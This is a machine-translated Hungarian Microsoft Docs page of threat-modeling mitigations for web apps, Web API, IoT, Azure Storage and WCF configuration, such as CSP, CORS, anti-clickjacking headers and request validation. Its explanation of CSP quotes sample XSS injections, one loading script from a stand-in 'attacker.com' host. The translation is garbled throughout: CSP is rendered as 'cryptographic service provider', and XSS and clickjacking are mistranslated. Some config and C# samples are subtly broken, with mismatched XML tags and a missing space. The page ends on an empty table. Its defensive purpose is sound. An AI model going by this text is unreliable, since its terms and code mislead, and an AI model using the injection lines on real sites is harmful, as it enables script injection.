---
title: "Konfigurációs felügyeleti - Microsoft fenyegetés modellezési eszköz - Azure |} Microsoft Docs"
description: "a fenyegetések modellezése eszköz felfedett fenyegetések megoldást"
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 114666d0c173786373e3bdd025027eb217922749
ms.sourcegitcommit: 18ad9bc049589c8e44ed277f8f43dcaa483f3339
ms.translationtype: MT
ms.contentlocale: hu-HU
ms.lasthandoff: 08/29/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>Biztonsági keret: Konfigurációkezelés |} Megoldást 
| A termék vagy szolgáltatás | Cikk |
| --------------- | ------- |
| **Webalkalmazás** | <ul><li>[Tartalom biztonsági házirend (CSP) megvalósítása, és tiltsa le a beágyazott javascript](#csp-js)</li><li>[Böngésző lehetővé szűrő engedélyezése](#xss-filter)</li><li>[ASP.NET-alkalmazások telepítését megelőzően nyomkövetéséhez és le kell tiltania](#trace-deploy)</li><li>[Hozzáférés külső JavaScript-kódok csak megbízható forrásból származó](#js-trusted)</li><li>[Győződjön meg arról, hogy a hitelesített ASP.NET-lapok tartalmaznia felhasználói felület Redressing vagy kattintással emelési védelmekkel](#ui-defenses)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET-webalkalmazások CORS engedélyezett](#cors-aspnet)</li><li>[ASP.NET-lapok ValidateRequest attribútum engedélyezése](#validate-aspnet)</li><li>[JavaScript-tárak legújabb verzióját helyileg üzemeltetett használata](#local-js)</li><li>[Tiltsa le az automatikus MIME-elemzése](#mime-sniff)</li><li>[Távolítsa el az általános jogú kiszolgálói fejlécek a Windows Azure Web Sites-ujjlenyomat elkerülése érdekében](#standard-finger)</li></ul> |
| **Adatbázis** | <ul><li>[A Windows tűzfal konfigurálása a hozzáféréshez](#firewall-db)</li></ul> |
| **Webes API** | <ul><li>[Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET Web API CORS engedélyezett](#cors-api)</li><li>[Titkosítani bizalmas adatokat tartalmazó Web API konfigurációs fájljainak szakaszait](#config-sensitive)</li></ul> |
| **IoT-eszközök** | <ul><li>[Győződjön meg arról, hogy az összes felügyeleti felületeiről biztosított erős hitelesítő adatokkal](#admin-strong)</li><li>[Győződjön meg arról, hogy ismeretlen kód nem hajtható végre olyan eszközök](#unknown-exe)</li><li>[Az operációs rendszer és az AppLocker-bit az IoT-eszközök további partíciók titkosítása](#partition-iot)</li><li>[Győződjön meg arról, hogy csak a minimális szolgáltatások vagy szolgáltatások engedélyezve vannak-e az eszközökön](#min-enable)</li></ul> |
| **Az IoT-mező átjáró** | <ul><li>[Az operációs rendszer és az AppLocker-bit IoT mező átjáró további partíciók titkosítása](#field-bit-locker)</li><li>[Győződjön meg arról, hogy az alapértelmezett bejelentkezési hitelesítő adatokat, a mező átjáró telepítésekor legyenek módosítva](#default-change)</li></ul> |
| **Az IoT átjáró** | <ul><li>[Győződjön meg arról, hogy az átjáró megvalósítja-e olyan folyamatot, amely a csatlakoztatott eszközök belső vezérlőprogram naprakészen tartása](#cloud-firmware)</li></ul> |
| **Gép megbízhatósági kapcsolat határán** | <ul><li>[Győződjön meg arról, hogy eszközök szervezeti házirendek szerint beállított végpont biztonsági vezérlő](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Az Azure storage elérési kulcsok biztonságos kezelése](#secure-keys)</li><li>[Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha a CORS engedélyezve van az Azure storage](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[A WCF szolgáltatás szabályozásával engedélyezése](#throttling)</li><li>[WCF-adatokhoz való illetéktelen hozzáférés metaadatok keresztül](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Tartalom biztonsági házirend (CSP) megvalósítása, és tiltsa le a beágyazott javascript

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Tartalom biztonsági házirend bemutatása](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [tartalom biztonsági szabályzatainak ismertetése](http://content-security-policy.com/), [biztonsági funkciók](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [tartalom biztonsági házirendbemutatása](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Használható CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Lépések** | <p>Tartalom biztonsági házirend (CSP), akkor egy védelemmel az olyan jellegű biztonsági eszköz, a W3C szabvány, amely lehetővé teszi az alkalmazástulajdonosok webes ellenőrzése a tartalmat a helyükön lévő beágyazott. Kriptográfiai Szolgáltató a webkiszolgálón HTTP-válaszfejléc meg van adva, és kikényszeríti a ügyféloldali böngészőkben. Egy engedélyezési lista-alapú házirend - webhely deklarálhatnak mely aktív tartalom a megbízható tartományok készlete, például JavaScript tölthetők be.</p><p>Kriptográfiai Szolgáltató a következő biztonsági előnyöket nyújtja:</p><ul><li>**Védelmet biztosít a lehetővé:** Ha egy lap lehetővé téve, egy támadó kihasználhatja azt 2 módon:<ul><li>Szúrjon `<script>malicious code</script>`. A biztonsági rés nem fog működni a felhőbeli Szolgáltató talál korlátozás-1 miatt</li><li>Szúrjon `<script src=”http://attacker.com/maliciousCode.js”/>`. A biztonsági rés nem fog működni, mivel az általa tartomány nem a felhőbeli Szolgáltató engedélyezett tartományok</li></ul></li><li>**Adatok exfiltration szabályozhatják:** Ha bármely rosszindulatú tartalmat weblapon megkísérli a külső webhelyek csatlakozhat, és ellopják adatok, a kapcsolat megszakította CSP-hez. Ez azért, mert a célként megadott tartomány nem lesz a felhőbeli Szolgáltató engedélyezési lista</li><li>**Kattintson az-emelési elleni védelmet:** kattintson-emelési egy támadási módszer használatával, amely egy ellenfél is keret a tényleges webhely és a kényszerített felhasználók felhasználói felületi elemei. Jelenleg kattintson-emelési elleni védelmet egy fejléc-X-keret-válaszbeállítások beállításával valósul meg. Nem minden böngésző, figyelembe vegyék ezt a fejlécet, és előre CSP is szabványos módon kattintson-emelési elleni védelemre</li><li>**Valós idejű támadás reporting:** Ha injektálási támadást egy CSP-kompatibilis webhelyen van, böngészők automatikusan vált az a webkiszolgálón beállított végpont üzenetszintű értesítést. Ezzel a módszerrel CSP valós idejű figyelmeztető rendszer funkcionál.</li></ul> |

### <a name="example"></a>Példa
Példa házirend: 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Ez a házirend lehetővé teszi, hogy a parancsprogramok töltendők be, csak a a webes alkalmazás kiszolgáló és a google analytics kiszolgálón. Bármely más helyről betöltött parancsprogramok a program elutasítja. Kriptográfiai Szolgáltató engedélyezve van a webhely, amikor a program automatikusan letiltja a következő funkciók lehetővé támadások mérséklése. 

### <a name="example"></a>Példa
Beágyazott parancsfájlokra nem fogja végrehajtani. Az alábbiakban példákat beágyazott parancsfájlokra 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Példa
Karakterláncok kódú nem lesz kiértékelve. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Böngésző lehetővé szűrő engedélyezése

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Lehetővé védelmi szűrő](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Lépések** | <p>X-lehetővé-védelmet válasz konfiguráció szabályozza a böngésző helyközi parancsfájl szűrő. A válasz fejléce a következő értékeket veheti fel:</p><ul><li>`0:`Ezzel a lépéssel letiltja a szűrő</li><li>`1: Filter enabled`Ha egy többhelyes parancsfájl-kezelési támogatás észlel, ahhoz, hogy a támadást, állítsa le a böngésző fog sanitize a lap</li><li>`1: mode=block : Filter enabled`. Ahelyett, hogy a lap sanitize, a lehetővé támadás észlelése esetén, mint a böngésző megakadályozza, hogy az oldal megjelenítési</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. A böngésző sanitize a lapot, és a jelentést a megsértése.</li></ul><p>Ez az okhoz CSP megsértése jelentések küldése az Ön által választott URI króm függvényt. Az elmúlt 2 beállítások biztonságos értékek számítanak.</p>|

## <a id="trace-deploy"></a>ASP.NET-alkalmazások telepítését megelőzően nyomkövetéséhez és le kell tiltania

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [ASP.NET Debugging Overview](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET követés áttekintése](http://msdn2.microsoft.com/library/bb386420.aspx), [How to: enable Tracing for ASP.NET-alkalmazás engedélyezése](http://msdn2.microsoft.com/library/0x5wc973.aspx), [hogyan: az ASP.NET-alkalmazások hibakeresés engedélyezése](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Lépések** | Ha nyomkövetése engedélyezve van a lap minden böngésző is jut hozzá a belső kiszolgáló állapota és a munkafolyamat adatait tartalmazó nyomkövetési adatokat kér. Ez az információ biztonsági bizalmas lehet. Hibakeresés engedélyezve van a lapon, ha hiba történik a kiszolgálón egy teljes verem nyomkövetési adatok jelenik meg a böngésző eredményez. Adatok biztonsági szempontból kényes információt a kiszolgálói munkafolyamat tehetik közzé. |

## <a id="js-trusted"></a>Hozzáférés külső JavaScript-kódok csak megbízható forrásból származó

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | külső JavaScript-kódok csak megbízható forrásból kell lehet hivatkozni. A referencia-végpontokat kell lennie az SSL. |

## <a id="ui-defenses"></a>Győződjön meg arról, hogy a hitelesített ASP.NET-lapok tartalmaznia felhasználói felület Redressing vagy kattintással emelési védelmekkel

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Védelmi Cheat lap kattintson-emelési OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - elleni kattintson-emelési az X-keret-beállítások](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **Lépések** | <p>kattintással emelési néven is ismert a "felhasználói felület jogorvoslati támadás", akkor, ha egy támadó használ több átlátszó vagy nem átlátszó réteg felhasználót: a felhasználó a gombra kattintva vagy csatlakoztatása egy másik lapon, ha azok volt kívánó lapon a legfelső szintű.</p><p>Ez a réteges létrehozásával egy rosszindulatú lapon iframe, amely betölti az áldozat oldalon érhető el. Ebből kifolyólag a támadó "térít" gombra kell kattintania azt jelentette, hogy a lap és útválasztási őket egy másik lapra, nagy valószínűséggel tulajdonosa egy másik alkalmazás, tartomány, vagy mindkettőt. Kattintson az-emelési támadások megelőzése érdekében állítsa be a megfelelő X-keret-beállítások HTTP-válaszfejlécek, melyek arra utasítják a böngésző számára más tartományokból keretezési engedélyezi</p>|

### <a name="example"></a>Példa
Az X-keret-beállítások fejlécet az IIS web.config keresztül állítható be. Web.config kódrészletet, amely soha nem keretezhető helyek: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Példa
Web.config kód csak keretezhető ugyanabban a tartományban lap webhelyekhez: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET-webalkalmazások CORS engedélyezett

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Web Forms keretrendszerre, MVC5 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | <p>Böngésző biztonsági megakadályozza, hogy egy weblap AJAX-kérelmek egy másik tartományra. Ez a korlátozás az azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságosan közzétételét mely más webhelyek is felhasználhatnak. Alhálózatok közötti Origin Resource Sharing (CORS), amely lehetővé teszi a kiszolgáló a azonos eredetű házirend enyhítése W3C szabvány. CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben.</p><p>A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák. A a fő CORS engedélyezése az eszköz néhány HTTP-válaszfejlécek hozzáadása (hozzáférés - vezérlési-*) a webes alkalmazás, és ez végezhető el több módon.</p>|

### <a name="example"></a>Példa
Ha Web.config rendelkezésére áll, majd a CORS segítségével is hozzáadhat a következő kódot: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Példa
Ha web.config való hozzáférés nem érhető el, majd CORS konfigurálhatja a következő csharp nyelvű kód felvétele: 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Vegye figyelembe, hogy nagyon fontos a győződjön meg arról, hogy a lista tartalmazza a "Hozzáférés-vezérlési-engedélyezése – Origin" attribútum van beállítva források végesnek és megbízható készlete. Nem sikerült konfigurálni a helytelenül eljárva (pl., mint érték "*") lehetővé teszi a rosszindulatú webhelyeket közötti eredetű kérések a webalkalmazás elindítása > nélkül korlátozások, ezáltal az alkalmazás a CSRF támadásokkal szemben sebezhető. 

## <a id="validate-aspnet"></a>ASP.NET-lapok ValidateRequest attribútum engedélyezése

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Web Forms keretrendszerre, MVC5 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Kérelem érvényesítése - parancsfájl támadások megelőzése](http://www.asp.net/whitepapers/request-validation) |
| **Lépések** | <p>Kérelem érvényesítése, a szolgáltatás az ASP.NET 1.1-es verzió óta megakadályozza, hogy a kiszolgáló elfogadása tartalmazó nem kódolt HTML tartalom. Ez a funkció célja, amellyel ügyfél parancsfájlkód vagy HTML is kell tudtukon továbbíthatók a kiszolgálóhoz, tárolt és jelenik majd meg a más felhasználók számára a parancsfájl-injektálás támadások megelőzése érdekében. Továbbra is javasoljuk, hogy az összes bemeneti adatok érvényesítése és HTML kódolására, amikor szükséges.</p><p>Kérelem érvényesítése potenciálisan veszélyes értékből álló lista összes bemeneti adatot összevetésével történik. Egyezés akkor fordul elő, ha az ASP.NET kivált egy `HttpRequestValidationException`. Kérelem érvényesítése funkció alapértelmezés szerint engedélyezve van.</p>|

### <a name="example"></a>Példa
Azonban ez a szolgáltatás letiltható lap szinten: 
```XML
<%@ Page validateRequest="false" %> 
```
vagy alkalmazás szinten 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Vegye figyelembe, hogy érvényesítés kérése a szolgáltatás nem támogatott, és nem MVC6 folyamat részeként. 

## <a id="local-js"></a>JavaScript-tárak legújabb verzióját helyileg üzemeltetett használata

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | N/A  |
| **Lépések** | <p>Standard JavaScript-könyvtárak JQuery kell használnia, mint segítségével a fejlesztők jóváhagyott közös JavaScript-tárak, amelyek nem tartalmaznak ismert biztonsági hiányosságokat verzióját. Egy jó gyakorlat az, hogy a szalagtárak legtöbb legújabb verzióját használja, mivel a régebbi verzióját az ismert biztonsági rések biztonsági javításokat tartalmaznak.</p><p>Ha a legújabb verzióra való kompatibilitás miatt miatt nem használható az alábbi minimális verziók kell használni.</p><p>Elfogadható minimális verziója:</p><ul><li>**JQuery**<ul><li>1.7.1 JQuery</li><li>JQueryUI 1.10.0</li><li>JQuery 1.9 ellenőrzése</li><li>JQuery Mobile 1.0.1-es</li><li>JQuery ciklus 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**AJAX-vezérlő eszközkészlet**<ul><li>AJAX-vezérlő eszközkészlet 40412</li></ul></li><li>**Az ASP.NET Web Forms keretrendszerre és Ajax**<ul><li>Az ASP.NET Web Forms keretrendszerre és Ajax 4</li><li>Az ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Soha nem tölthető be egyetlen JavaScript kódtár külső helyekről, például a nyilvános tartalomtovábbító</p>|

## <a id="mime-sniff"></a>Tiltsa le az automatikus MIME-elemzése

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [IE8 biztonsági rész V: átfogó védelmének](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-típus](http://en.wikipedia.org/wiki/Mime_type) |
| **Lépések** | Az X-tartalom-típust-beállítások fejlécet, amely lehetővé teszi a fejlesztők számára adja meg, hogy a tartalmat nem kell MIME-felszippantásra HTTP-fejléc. Ezt a fejlécet védelme az MIME-elemzés célja. Az egyes lapok tartalmazhatnak felhasználói ellenőrizhető tartalmat, használnia kell a HTTP-fejléc X-tartalom-típust-beállítások: nosniff. A kötelező fejlécet globálisan az alkalmazás összes lapja esetében engedélyezni, tegye a következők valamelyikét|

### <a name="example"></a>Példa
A fejléc hozzáadása a web.config fájlban, ha az alkalmazás által az Internet Information Services (IIS) 7 és újabb verziók esetében. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Példa
A globális alkalmazáson keresztül fejléc hozzáadása\_BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Példa
Egyéni HTTP-modulja megvalósítása 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Példa
A szükséges fejléc csak az adott lapok egyes válaszok való hozzáadással engedélyezheti: 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Távolítsa el az általános jogú kiszolgálói fejlécek a Windows Azure Web Sites-ujjlenyomat elkerülése érdekében

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Web Application | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | EnvironmentType – Azure |
| **Hivatkozások**              | [A Windows Azure Web Sites általános jogú kiszolgálói fejlécek eltávolítása](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Lépések** | Fejlécek, például a kiszolgáló, X-regisztráló-, X-AspNet-verzió a kiszolgáló és az alapjául szolgáló technológiák kapcsolatos információk felfedése. Javasoljuk, hogy ezek a fejlécek ezáltal mellőzése megakadályozza, hogy az alkalmazás-ujjlenyomat |

## <a id="firewall-db"></a>A Windows tűzfal konfigurálása a hozzáféréshez

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Adatbázis | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | Az SQL Azure, a helyi üzemeltetésű |
| **Attribútumok**              | N/A, SQL verzió - 12-es verzió |
| **Hivatkozások**              | [Egy Azure SQL database-tűzfal konfigurálásáról](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [beállítani a Windows tűzfalat a hozzáféréshez](https://msdn.microsoft.com/library/ms175043) |
| **Lépések** | A Súgó tűzfalrendszerekről jogosulatlan hozzáférés elkerülése érdekében a számítógép-erőforrásokat. Az SQL Server adatbázismotor példánya tűzfalon keresztüli eléréséhez konfigurálnia kell a tűzfal engedélyezi a hozzáférést az SQL Servert futtató számítógép |

## <a id="cors-api"></a>Győződjön meg arról, hogy csak megbízható források engedélyezve legyenek-e, ha az ASP.NET Web API CORS engedélyezett

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | MVC 5 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Az ASP.NET Web API 2 eltérő eredetű kérések engedélyezése](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - ASP.NET Web API 2 a CORS-támogatás](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Lépések** | <p>Böngésző biztonsági megakadályozza, hogy egy weblap AJAX-kérelmek egy másik tartományra. Ez a korlátozás az azonos eredetű házirend nevezik, és megakadályozza, hogy egy rosszindulatú hely bizalmas adatok olvasása a másik helyről. Azonban néha lehet szükséges API-k biztonságosan közzétételét mely más webhelyek is felhasználhatnak. Alhálózatok közötti Origin Resource Sharing (CORS), amely lehetővé teszi a kiszolgáló a azonos eredetű házirend enyhítése W3C szabvány.</p><p>CORS használatával egy kiszolgáló kifejezetten engedélyezhet bizonyos egyes eltérő eredetű kérések elutasítása mások közben. A CORS biztonságosabb és rugalmasabb, mint például a JSONP korábbi technikák.</p>|

### <a name="example"></a>Példa
A App_Start/WebApiConfig.cs adja hozzá a következő kódot a WebApiConfig.Register metódus 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Példa
EnableCors attribútum alkalmazható műveletmetódusokhoz egy tartományvezérlőre a következőképpen: 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Vegye figyelembe, hogy nagyon fontos a győződjön meg arról, hogy a források végesnek és megbízható készlete EnableCors attribútum tartalmazza a lista van beállítva. Nem sikerült a beállítás nem megfelelően (például érték szerint "*") lehetővé teszi a rosszindulatú webhelyeket való közötti eredetű kérések, korlátozások nélküli API > ezáltal a CSRF támadásokkal szemben sebezhető az API-t. EnableCors vezérlő szintjén látható is el. 

### <a name="example"></a>Példa
Az osztály egy adott metódusra CORS letiltásához a DisableCors attribútum használható alább látható módon: 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL fázis**               | Felépítés |  
| **Alkalmazandó technológiák** | MVC 6 |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Az ASP.NET Core 1.0 (CORS) eltérő eredetű kérések engedélyezése](https://docs.asp.net/en/latest/security/cors.html) |
| **Lépések** | <p>Az ASP.NET Core 1.0-s verziójában a CORS engedélyezhető köztes akár segítségével MVC. MVC használata a CORS engedélyezése esetén az azonos CORS-szolgáltatásokat használja, de a CORS köztes nem.</p>|

**Megközelítés-1** CORS engedélyezése a köztes: engedélyezze a teljes alkalmazás CORS vegye fel a CORS köztes a kérelemfeldolgozási sorban, a UseCors bővítmény metódussal. Eltérő eredetű házirend hozzáadása a CORS köztes a CorsPolicyBuilder osztály használata során adható meg. Ehhez két módja van:

### <a name="example"></a>Példa
Az egyik UseCors hívja meg egy lambda kifejezésben. A lambda egy CorsPolicyBuilder objektum hajtja végre: 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Példa
A második pedig egy vagy több elnevezett CORS házirendek meghatározása, és válassza a házirend neve futási időben. 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Megközelítés-2** CORS engedélyezése az mvc-ben: a fejlesztők azt is megteheti a MVC műveletenként, vezérlőnként és globálisan az összes adott CORS alkalmazni.

### <a name="example"></a>Példa
Műveletenként: Adja meg a CORS-házirend egy bizonyos művelet adja hozzá a [EnableCors] attribútumot a művelethez. Adja meg a házirend nevét. 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Példa
Vezérlőnként: 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Példa
Globális: 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Vegye figyelembe, hogy nagyon fontos a győződjön meg arról, hogy a források végesnek és megbízható készlete EnableCors attribútum tartalmazza a lista van beállítva. Nem sikerült a beállítás nem megfelelően (például érték szerint "*") lehetővé teszi a rosszindulatú webhelyeket való közötti eredetű kérések, korlátozások nélküli API > ezáltal a CSRF támadásokkal szemben sebezhető az API-t. 

### <a name="example"></a>Példa
A vezérlő vagy a művelet CORS letiltásához használja a [DisableCors] attribútumot. 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Titkosítani bizalmas adatokat tartalmazó Web API konfigurációs fájljainak szakaszait

| Cím                   | Részletek      |
| ----------------------- | ------------ |
| **Összetevő**               | Webes API | 
| **SDL fázis**               | Környezet |  
| **Alkalmazandó technológiák** | Általános |
| **Attribútumok**              | N/A  |
| **Hivatkozások**              | [Útmutató: Az ASP.NET 2.0 használatával DPAPI konfigurációs szakasz titkosítása](https://msdn.microsoft.com/library/ff647398.aspx), [adja meg egy védett Konfigurációszolgáltatót](https://msdn.microsoft.com/library/68ze1hb2.aspx), [Azure Key Vault használatával alkalmazás titkos kulcsok védelme](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Lépések** | Konfigurációs fájlok, például a Web.config fájlként appsettings.json gyakran használt bizalmas adatokat, beleértve a felhasználónevek, jelszavak, adatbázis-kapcsolati karakterláncok és titkosítási kulcsok tárolásához. Ha ezt az információt nem védi, az alkalmazás ki van téve a támadók vagy rosszindulatú felhasználók megszerezni a bizalmas adatokat, például a fiók felhasználói nevét és a jelszavak, a adatbázis nevét és a kiszolgálók nevei. Alapján a központi telepítési típus (azure vagy a helyszínen), titkosítsa a bizalmas DPAPI-t vagy szolgáltatásokat, mint az Azure Key Vault segítségével konfigurációs fájljainak szakaszait. |

## <a id="admin-strong"></a>Győződjön meg arról, hogy az összes felügyeleti felületeiről biztosított erős hitelesítő adatokkal

| Cím                   | Részletek      |
| ----------------------- | ------------ |
